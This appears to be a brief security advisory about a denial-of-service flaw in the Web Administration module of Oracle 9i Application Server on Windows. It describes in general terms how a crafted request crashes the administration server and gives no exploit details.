Oracle 9i Application Server (9iAS) allows remote administration via a web access module. This vulnerability affects Oracle 9iAS running on Microsoft Windows.

When a custom request is sent to the Web Administration module, the module may react unpredictably. By sending a malicious custom request to the module, it is possible to cause the administration server to crash. A manual restart of the server is required to resume service.
